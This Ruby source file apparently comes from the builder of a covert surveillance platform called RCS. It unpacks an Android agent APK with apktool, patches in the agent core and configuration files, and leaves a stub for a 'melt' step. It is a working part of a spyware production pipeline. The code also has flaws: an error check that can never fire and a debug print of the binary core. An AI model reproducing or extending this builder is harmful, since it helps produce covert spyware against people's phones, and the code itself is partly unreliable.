#
#  Agent creation for android
#

# from RCS::Common
require 'rcs-common/trace'

require 'find'

module RCS
module DB

class BuildAndroid < Build

  def initialize
    super
    @platform = 'android'
  end

  def unpack
    super

    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

    apktool = path('apktool.jar')
    core = path('core')

    system "java -jar #{apktool} d #{core} #{@tmpdir}/apk" || raise("cannot unpack with apktool")

    if File.exist?(path('apk/res/raw/resources.bin'))
      @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
    else
      raise "unpack failed. needed file not found"
    end
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'apk/res/raw/resources.bin'
    params[:config] = 'apk/res/raw/config.bin'

    puts File.read path('apk/res/raw/resources.bin')
    
    # invoke the generic patch method with the new params
    super

  end

  def melt(params)
    trace :debug, "#{self.class} #{__method__}"
  end

end

end #DB::
end #RCS::
